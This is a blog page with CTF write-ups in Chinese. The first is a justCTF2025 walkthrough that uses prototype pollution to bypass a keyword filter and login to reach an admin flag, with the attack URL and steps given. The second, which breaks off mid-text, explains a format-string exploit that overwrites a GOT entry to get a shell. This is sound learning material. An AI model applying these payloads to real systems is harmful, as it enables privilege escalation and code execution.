<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jointjs = <span class="built_in">require</span>(<span class="string">&quot;jointjs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before : &quot;</span> + obj.<span class="property">polluted</span>);</span><br><span class="line">jointjs.<span class="property">util</span>.<span class="title function_">setByPath</span>(&#123; &#125;, <span class="string">&#x27;__proto__/polluted&#x27;</span>, <span class="string">&quot;yes&quot;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After : &quot;</span> + obj.<span class="property">polluted</span>);</span><br></pre></td></tr></table></figure>

<h5 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h5><h6 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h6><p>假设后端检查权限，通过污染让所有对象都有 <code>isAdmin: true</code> → 直接获得管理员权限</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (user.<span class="property">isAdmin</span>) <span class="title function_">grantAdminAccess</span>();</span><br></pre></td></tr></table></figure>

<h6 id="绕过属性检查"><a href="#绕过属性检查" class="headerlink" title="绕过属性检查"></a>绕过属性检查</h6><p>如果污染了 <code>Object.prototype.hasOwnProperty</code>，就可以绕过检查</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="keyword">if</span> (obj.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">    <span class="comment">// 以为安全</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h6><p>通常发生在代码程序执行了对象上的一个特殊属性。如</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(someobject.<span class="property">someattr</span>)</span><br></pre></td></tr></table></figure>

<p>在这种情况下，如果攻击者污染了 <code>Object.prototype.someattr</code> ，那么就可能导致远程代码执行。</p>
<h6 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h6><p>通常发生在 <code>Object</code> 对象持有的一些方法被隐式调用（如<code>toString</code> 和 <code>valueOf</code>）。</p>
<p>攻击者可以污染 <code>Object.prototype.someattr</code> 并改变为一个程序非预期的值，如<code>Int</code> 或 <code>Object</code>，可能导致程序无法正常工作，从而造成DoS。</p>
<h5 id="原型污染防范"><a href="#原型污染防范" class="headerlink" title="原型污染防范"></a>原型污染防范</h5><ol>
<li><p>过滤关键字： <code>__proto__</code> 、 <code>prototype</code>和 <code>constructor</code> 属性</p>
</li>
<li><p>避免使用不规范的递归。即使使用也要严格检查<code>key</code>，不能是<code>__proto__</code>和<code>constructor</code>。</p>
</li>
<li><p>考虑使用不带原型的对象，从而打断原型链。如<code>Object.create(null)</code>。</p>
</li>
<li><p>使用<code>Map</code>替换<code>Object</code>。</p>
</li>
</ol>
<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>由 Gemini 生成的 Express 应用，包括用户注册、登录功能和自定义主题等功能。</p>
<p>注册用户 user1&#x2F;123 ，登录之后可看到的页面如右图</p>
<img src="../../../web/web/images/n268d9Iwz0R2lINrdUdkWAAhVh6WIiD6dp5vufXtCtU.png" alt="image" style="zoom:67%;" />

<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><strong>一、定位关键字 <code>flag</code></strong></p>
<p>分析源码，搜索关键字 <code>flag</code> ，发现如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15. Define the `/flag` endpoint (protected)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(users[req.<span class="property">session</span>.<span class="property">userId</span>].<span class="property">isAdmin</span> == <span class="literal">true</span>)&#123; </span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="variable constant_">FLAG</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;Not admin :(&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>代码逻辑如下：</p>
<p>1）用户访问 &#x2F;flag 页面时触发该处理器</p>
<p>2）首先验证用户是否成功登录</p>
<p>3）若成功登录，判断是否具备管理员权限；若具备则返回FLAG，反之返回 Not admin</p>
<p>结合上述分析，需要一个具备管理员权限的用户，登录成功后访问 &#x2F;flag 路径即可获得FLAG。</p>
<p><strong>二、定位危险函数 <code>deepMerge</code></strong> </p>
<p>分析源码发现，定义了递归合并函数 <code>deepMerge</code> ，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 6. A function to recursively merge objects</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">deepMerge</span> = (<span class="params">target, source</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">    <span class="keyword">if</span> (source[key] <span class="keyword">instanceof</span> <span class="title class_">Object</span> &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">      <span class="title class_">Object</span>.<span class="title function_">assign</span>(source[key], <span class="title function_">deepMerge</span>(target[key], source[key]));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">assign</span>(target || &#123;&#125;, source);</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>函数作用是将 <code>source</code> 对象的所有可枚举属性地复制到 <code>target</code>（有可能为{}）上。</p>
<p>存在递归合并函数时，考虑原型链污染漏洞。</p>
<p><strong>三、分析原型链污染的可能性</strong></p>
<p>查找函数调用链，发现 <code>app.get(&#39;theme&#39;,....)</code> 调用 <code>deepMerge</code> ，部分代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15. Define the `/theme` endpoint (protected)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/theme&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  ......</span><br><span class="line">  <span class="comment">// 解析请求参数，过滤关键字 __proto__，prototype，constructor等</span></span><br><span class="line">  <span class="keyword">const</span> parsedUpdates = <span class="title function_">parseQueryParams</span>(queryString);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Object</span>.<span class="title function_">keys</span>(parsedUpdates).<span class="property">length</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 调用deepMerge</span></span><br><span class="line">    user.<span class="property">themeConfig</span> = <span class="title function_">deepMerge</span>(user.<span class="property">themeConfig</span>, parsedUpdates);</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>但是在调用 <code>parseQueryParams</code> 函数之前，先调用<code>parseQueryParams</code>函数解析请求参数，过滤了 <code>[&#39;__proto__&#39;, &#39;prototype&#39;, &#39;constructor&#39;]</code> 等关键字。代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 7. A function to parse a query string with dot-notation keys.</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">parseQueryParams</span> = (<span class="params">queryString</span>) =&gt; &#123;</span><br><span class="line">  .....</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> params.<span class="title function_">entries</span>()) &#123;</span><br><span class="line">    <span class="keyword">const</span> path = key.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    .....</span><br><span class="line">      <span class="comment">// 过滤关键字</span></span><br><span class="line">      <span class="keyword">if</span>([<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>].<span class="title function_">includes</span>(part))&#123;</span><br><span class="line">        part = <span class="string">&#x27;__unsafe$&#x27;</span> + part;</span><br><span class="line">      &#125;</span><br><span class="line">      ......</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>故直接污染 <code>object.prototype.isAdmin</code>的思路行不通</p>
<p><strong>四、原型链污染扩展</strong></p>
<p>再次查看获取 <code>flag</code> 的相关代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 15. Define the `/flag` endpoint (protected)</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, isAuthenticated, <span class="function">(<span class="params">req, res, next</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="comment">// 关键判断</span></span><br><span class="line">  <span class="keyword">if</span>(users[req.<span class="property">session</span>.<span class="property">userId</span>].<span class="property">isAdmin</span> == <span class="literal">true</span>)&#123; </span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="variable constant_">FLAG</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">end</span>(<span class="string">&quot;Not admin :(&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>关键代码是 <code>users[req.session.userId].isAdmin == true</code> ，其中：</p>
<p>​	<code>req.session.userId</code> 在用户登录认证通过后赋值为 <code>username</code> </p>
<p>​	<code>users</code> 初始化为 {} ，在用户注册成功后存入数据 <code>&#123; username: &#123; password, userThemeConfig, isAdmin &#125; &#125;</code></p>
<p>可知<code>users.__proto__</code> 就是 <code>Object.prototype</code> ，如下：</p>
<style>.xhpucjmpilfw{zoom: 67%;}</style><img src="/2025/08/10/justCTF2025/image-20250812193235289-1762219779844-12.png" class="xhpucjmpilfw" alt="image-20250812193235289-1762219779844-12">

<p>故<code>users</code> 除了自身的属性：<code>user1</code> 之外；还有继承自原型（即 <code>Object</code>）的属性，如 <code>constructor</code>，<code>hasOwnProperty</code>，<code>isPrototypeOf</code> 和 <code>toString</code> 等</p>
<p><code>users[req.session.userId]</code> 本质上是获取users的一个属性，所以 <code>req.session.userId</code> 不一定是合法的用户名（如 <code>user1</code>），也可以是 <code>users</code> 的其它属性（如 <code>constructor</code>，<code>hasOwnProperty</code>，<code>isPrototypeOf</code> 和 <code>toString</code> 等），只要保证<code>users[某属性]</code> 返回非空的结果即可</p>
<p>然后确保 <code>users[某属性]</code> 的<code>.isAdmin</code> 值为 1，就可以使得 <code>if</code> 条件判断为真，进获取 <code>FLAG</code> 。</p>
<p>综上所述，攻击思路如下：</p>
<p>​	1）通过原型链污染原型Object的属性（如 <code>constructor</code>，<code>hasOwnProperty</code>和 <code>toString</code> 等），在该受污染属性上添加 <code>isAdmin</code> 、并将值设置为1 。</p>
<p>​	2）尝试以该属性名称为 <code>username</code> 注册&#x2F;登录系统，则 <code>users[受污染属性].isAdmin</code>  值为1 ，然后访问 <code>/flag</code> 即可获取FLAG。</p>
<p>第1步前面已讨论过，存在递归合并函数 <code>deepMerge</code> ，可以实现原型链污染。下面讨论第2步如何实现以特殊用户（属性名称）登录系统</p>
<p><strong>五、登录认证绕过</strong></p>
<p>尝试以原型Object的属性名称注册&#x2F;登录用户，以 <code>toString</code> 为例（使用其它继承自<code>Object</code>的属性，如 <code>constructor</code>，<code>hasOwnProperty</code>和 <code>toLocalString</code> 等都可以）。</p>
<p>理想情况是先注册、再登录。但是在注册时提示用户已经存在：</p>
<style>.ursxxgcqbdws{zoom: 50%;}</style><img src="/2025/08/10/justCTF2025/image-20250812201006695.png" class="ursxxgcqbdws" alt="image-20250812201006695">

<p>查看注册相关的代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="comment">// 判断用户名是否存在</span></span><br><span class="line">  <span class="keyword">if</span> (users[username]) &#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">errorMessage</span> = <span class="string">&#x27;User already exists!&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/register&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ......</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>如前所述，<code>users</code> 的原型为 <code>Object</code> 。当 <code>username</code> 为 <code>toString</code>时，因为<code>users</code>自身不包含 <code>toString</code> 属性，故<code>users[username]</code> 返回的是<code>users.__proto__.toString</code> 即<code>Object.toString</code> 方法。如下：</p>
<style>.jjkpvexvuthu{zoom:67%;}</style><img src="/2025/08/10/justCTF2025/image-20250812201644955.png" class="jjkpvexvuthu" alt="image-20250812201644955">

<p><code>users[username]</code>非空，返回用户已存在，所以没有办法再次注册。</p>
<p>尝试 <code>toString/123</code> 直接登录，调试发现执行到304行验证用户名和密码时，关键变量的值如下：</p>
<p><img src="/image-20250812202547181-1762342243354-5.png" alt="image-20250812202547181"></p>
<p>​	<code>user</code> 值为 <code>Object.toString()</code> 方法，非空；</p>
<p>​	<code>user.password</code> &#x3D;&#x3D; <code>toString().password</code> &#x3D;&#x3D; <code>undefined</code></p>
<p>故要想通过304行的检查，将变量 <code>password</code> 的值设置为 <code>undefined</code> 即可。这样就可以绕过认证，以用户名 <code>toString</code> 成功登录系统。</p>
<p><strong>六、攻击步骤</strong></p>
<p>结合以上分析，可执行的攻击步骤如下：</p>
<ol>
<li>污染原型属性 <code>Object.toString</code></li>
</ol>
<p>原型链污染发生的函数为 <code>deepMerge</code>，其调用链为：</p>
<p>​	 <code>app.get(&#39;/theme&#39;,isAuthenticated,...)</code>  –&gt;  <code>parseQueryParams</code>  –&gt;  <code>deepMerge</code> </p>
<p>访问 &#x2F;theme 时需要用户已经登录，故先注册、登录普通用户 <code>user1</code> ，然后通过传递 <code>toString.isAdmin=1</code> 的查询参数，污染 <code>Object.prototype.toString</code>，在<code>toString</code>上添加 <code>isAdmin</code>、并将值置为 1 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 原型污染 url</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.43</span><span class="number">.148</span>:<span class="number">3000</span>/theme?toString.isAdmin=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>访问过程中<code>parseQueryParams</code> 函数会生成对象：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">toString</span>: &#123; <span class="attr">isAdmin</span>: <span class="string">&quot;1&quot;</span> &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>随后调用 <code>deepMerge</code> 函数合并对象时，会将 <code>&#123; isAdmin: &quot;1&quot; &#125;</code> 合并到 <code>Object.prototype.toString</code> 上，导致所有对象的 <code>toString.isAdmin</code> 被污染。下图是污染前后 的<code>toString</code> ，可以看到污染后的 <code>toString</code> 多了 <code>isAdmin</code> 属性，且值为1：</p>
<style>.dnnehnejyxix{zoom:67%;}</style><img src="/2025/08/10/justCTF2025/image-20250812205418685.png" class="dnnehnejyxix" alt="image-20250812205418685">



<ol start="2">
<li>登录为 <code>toString</code> 用户</li>
</ol>
<p>污染成功后，使用 <code>toString</code>用户名登录，<code>password</code>处随便填写，使用bp抓包后删除<code>password</code>字段后发送</p>
<p>页面跳转后说明登录成功，然后访问 &#x2F;flag 成功</p>
<p><img src="/gKArT-n1j8HpMhq69a5SQdMfXrSCd1B072R-nVOSWVA.png" alt="gKArT-n1j8HpMhq69a5SQdMfXrSCd1B072R-nVOSWVA"></p>
<h4 id="题目总结"><a href="#题目总结" class="headerlink" title="题目总结"></a>题目总结</h4><h5 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h5><ol>
<li>JS原型链污染漏洞利用及扩展</li>
<li>登录认证函数逻辑漏洞的识别与利用</li>
</ol>
<h5 id="关键技巧"><a href="#关键技巧" class="headerlink" title="关键技巧"></a>关键技巧</h5><ol>
<li><strong>原型污染扩展</strong>：</li>
</ol>
<p>​	利用原生属性（如 <code>toString</code>）绕过对 <code>__proto__</code> 的过滤。</p>
<p>​	通过 <code>deepMerge</code> 将污染扩散到原型链。</p>
<ol start="2">
<li><strong>认证函数逻辑漏洞</strong>：</li>
</ol>
<p>​	利用 <code>users</code> 对象继承 <code>Object.prototype</code> 的特性，使 <code>toString</code> 成为“已存在用户”。</p>
<p>​	通过 <code>undefined === undefined</code> 绕过密码检查。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://gist.github.com/terjanq/fa6f19d46bcb85bb61c146747dec0758#positive-players--write-up-by-terjanq">https://gist.github.com/terjanq/fa6f19d46bcb85bb61c146747dec0758#positive-players--write-up-by-terjanq</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/08/10/justCTF2025/" data-id="cuidT5qwmRvaiqEwgrJT4VupB" data-title="justCTF2025 web" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-printf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/12/28/printf/" class="article-date">
  <time class="dt-published" datetime="2024-12-28T07:16:27.000Z" itemprop="datePublished">2024-12-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/12/28/printf/">格式化字符串</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><strong>声明：本文用途为供自己学习</strong><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41560595/article/details/114916869">参考文章一：CSDN-云啾啾啾（作者）-buuctf——[第五空间2019 决赛]PWN5 1</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41696518/article/details/125771666">参考文章二：CSDN-Mokapeng（作者）-[第五空间2019 决赛]PWN5 ——两种解法</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/115061803">参考文章三：CSDN-lifanxin(作者)-CTF pwn题之格式化字符串漏洞详解</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/525576998">参考文章四：知乎-看雪（作者）-PWN入门-格式化字符串漏洞</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/dfb9300aa76b">参考文章五：简书-杰森任（作者）-PWN格式化字符串漏洞1（基础知识）</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/u014377094/article/details/124902890?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165941639716782425169227%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165941639716782425169227&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~pc_rank_34-6-124902890-null-null.142%5Ev38%5Epc_rank_34&utm_term=pwn%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187">参考文章七：CSDN-Marx_ICB（作者）-【PWN】格式化字符串漏洞原理</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43092232/article/details/105648769">参考文章八：CSDN-n19hT（作者）-gdb调试 | pwndbg+pwndbg联合使用</a></p>
<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
<h2 id="一、思路"><a href="#一、思路" class="headerlink" title="一、思路"></a>一、思路</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41696518/article/details/125771666">参考文章：CSDN-Mokapeng（作者）-[第五空间2019 决赛]PWN5 ——两种解法</a>（参考部分：题目分析）</p>
<h3 id="（一）格式化字符串漏洞"><a href="#（一）格式化字符串漏洞" class="headerlink" title="（一）格式化字符串漏洞"></a>（一）格式化字符串漏洞</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/115061803">参考文章：CSDN-lifanxin-CTF(作者)-pwn题之格式化字符串漏洞详解</a>（参考部分：概念）<br>  格式化字符串漏洞的成因在于像<code>printf/sprintf/snprintf</code>等格式化打印函数都是接受可变参数的，而一旦程序编写不规范，比如正确的写法是：<code>printf(&quot;%s&quot;, pad)</code>，偷懒写成了：<code>printf(pad)</code>，此时就存在格式化字符串漏洞</p>
<h3 id="（二）方法一：篡改随机数（密码）"><a href="#（二）方法一：篡改随机数（密码）" class="headerlink" title="（二）方法一：篡改随机数（密码）"></a>（二）方法一：篡改随机数（密码）</h3><p><img src="/5d998f6d106288471f1425ec0c940f95.png"><br>        如图可知main函数的功能是从<code>/dev/urandom</code>文件读取一个随机数，比对输入的<code>passwd</code>是否与该随机数一致，一致则<code>getshell</code>，而<code>printf</code>函数没有设定格式化参数，与输入的<code>passwd</code>比较的数字的地址也可以看到是<code>0x804C044</code>，因此可以利用格式化字符串漏洞，在第一次输入<code>name</code>的时候修改<code>0x804C044</code>的内容，第二次输入<code>passwd</code>时输入改内容（字符串格式，用<code>str</code>函数，其参数为16进制数字)</p>
<h3 id="（三）方法二：篡改atoi地址为system地址并传入参数-bin-sh"><a href="#（三）方法二：篡改atoi地址为system地址并传入参数-bin-sh" class="headerlink" title="（三）方法二：篡改atoi地址为system地址并传入参数&quot;/bin/sh&quot;"></a>（三）方法二：篡改atoi地址为system地址并传入参数<code>&quot;/bin/sh&quot;</code></h3><p>第一次输入通过格式化字符串漏洞篡改<code>atoi</code>函数<code>got</code>地址为<code>system</code>函数的真实地址，第二次输入<code>passwd</code>为字符串<code>&quot;/bin/sh&quot;</code></p>
<h2 id="二、攻击过程"><a href="#二、攻击过程" class="headerlink" title="二、攻击过程"></a>二、攻击过程</h2><h3 id="（一）方法一"><a href="#（一）方法一" class="headerlink" title="（一）方法一"></a>（一）方法一</h3><p><img src="/6dcabdaa34cef690f69c18baa797d6f9.png" alt="chesec"></p>
<p><img src="/3c33d8595975c6f085d9c0d9e68acb7b.png" alt="enter description here"></p>
<p><img src="/68283f255046e168c921e5f37889b480.png" alt="enter description here"></p>
<p><img src="/2570f40a684b9e8dd24838af686cc077.png" alt="enter description here"></p>
<p>根据上述内容，有<code>Canary</code>保护、有未给出格式化参数的错误使用的<code>printf</code>和地址已知的<code>if</code>语句中的变量，而且第一次<code>read</code>的数据长度为0x63个byte，因此用第一次输入构造<code>payload</code>,使得可以向<code>0x804C044</code>这个地址中任意写入。<br>以下是个人对于格式化字符串漏洞的相关深入探究：</p>
<h4 id="1-审计代码（反汇编代码）和调试程序"><a href="#1-审计代码（反汇编代码）和调试程序" class="headerlink" title="1.审计代码（反汇编代码）和调试程序"></a>1.审计代码（反汇编代码）和调试程序</h4><h5 id="（1）第一步"><a href="#（1）第一步" class="headerlink" title="（1）第一步"></a>（1）第一步</h5><p>工具：<code>pwngdb</code>，IDApro32；<br>调试参数：<code>b *0x80492BB</code>（相关地址均通过IDA得到）、<code>r</code>、<code>AAAA-%p-%p-%p</code>、<code>stack 20</code> 、（此时显示为第一张图片）<code>ni</code>、<code>stack 20</code>（第二张图片）；*<br><img src="/d95e7e5b7dccbb246e66fc2da7f6d010.png" alt="enter description here"><br>（以下内容过于基础）此时，<code>eip</code>指向<code>0x80492bb</code>，说明此时下一条执行的指令为<code>push eax</code>，所以当前执行的指令是<code>lea eax,[ebp - 0x70]</code>。<br><img src="/3d48e44209ffe6e8adca6fc4b5492f69.png" alt="enter description here"><br>接着执行上述<code>0x80492BB</code>处的<code>push eax</code>（<code>eax</code>存放的为下一条l指令： <code>call printf@plt</code>的参数，即刚刚的输入的<code>AAAA-%p-%p-%p</code>起始位置所在的地址被压入栈中)</p>
<h5 id="（2）第二步-深入探究"><a href="#（2）第二步-深入探究" class="headerlink" title="（2）第二步 深入探究"></a>（2）第二步 深入探究</h5><p>刚刚提到经过<code>push eax</code>后，输入的字符串的输入的<code>AAAA-%p-%p-%p</code>起始位置所在的地址被压倒了栈中，而<code>AAAA-%p-%p-%p</code>内容本身放在哪里？<br>在pwngdb中继续进行调试，调试参数：<code>d</code>、<code>b *0x804929B</code>、<code>r</code>、<code>AAAA-%p-%p-%p</code>。*<br><img src="/f2802996fd356dc2433c2f260d53614e.png" alt="enter description here"><br>通过IDA的伪代码可以看到，键盘输入的内容被放入<code>buf</code>中，而<code>buf</code>的起始位置通过<code>ebp</code>信息（<code>0xffffd0a8</code>下图第一处划线处）和其与<code>ebp</code>的偏移量（<code>0x70</code>）可以算出来（上图第一处画线位置），就是<code>0x804929B</code>（也可以直接通过下图中第三处划线位置<code>buf</code>：<code>0xffffd038</code>看出来）<br><img src="/99855b914900f070472fb8629c9d2155.png" alt="--"></p>
<h5 id="（3）第三步"><a href="#（3）第三步" class="headerlink" title="（3）第三步"></a>（3）第三步</h5><p>再次回到第一步的第二张图，<br><img src="/3d48e44209ffe6e8adca6fc4b5492f69.png" alt="enter description here"><br>此时输入调试命令：<code>print /x *0xffffd038</code>（以16进制格式打印栈空间上<code>0xffffd038</code>地址处的内容）*，结果如下<br><img src="/704c23209b52b3c023944e6d857870a2.png" alt="enter description here"><br>现在退出<code>pwngdb</code>，运行该程序，输入参数<code>AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</code>，结果如下图：<br><img src="/d017fe60200ee01481ccb243086bd654.png" alt="enter description here"></p>
<h3 id="2-理论分析"><a href="#2-理论分析" class="headerlink" title="2.理论分析"></a>2.理论分析</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52111404/article/details/127699376?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22127699376%22,%22source%22:%22weixin_52111404%22%7D">如果对格式化字符串漏洞理解起来困难，建议看下这篇博客</a></p>
<p>第一个<code>%p</code>打印的是从<code>printf</code>参数的起始位置（本题中为<code>0xffffd010</code>，该位置偏移量为0）的下一个位置开始（偏移量为1）的内容，所以第一个%p的输出内容为<code>0xffffd014</code>的内容，依此类推。而<code>buf</code>的起始地址为<code>0xffffd038</code>，<code>printf</code>参数的地址为<code>0xffffd010</code>,所以其二者间的偏移量为10（0x28byte，每个偏移量占4byte，16进制）。在上图输出结果可以看到以<code>AAAA</code>为偏移量0开始算起，第十个偏移量的位置正是<code>0x41414141</code>（AAAA的16进制格式）。其他格式化字符串原理类似<code>%p</code>，例如<code>%10$n</code>，就是把当前格式化参数（<code>%10$n</code>）之前字符数（char类型）的数值大小，赋值给从<code>printf</code>的参数所在栈的位置的起始位置（偏移量为0）开始算起，第10个偏移量的栈空间的位置中的内容作为地址，把该地址对应的内容（只修改一个字（2个byte），改变修改的字节量可以改用<code>%10$hn</code>等（大概吧）），修改为前面说的“字符串数的数值大小”。<br>上段内容最后一句话<a target="_blank" rel="noopener" 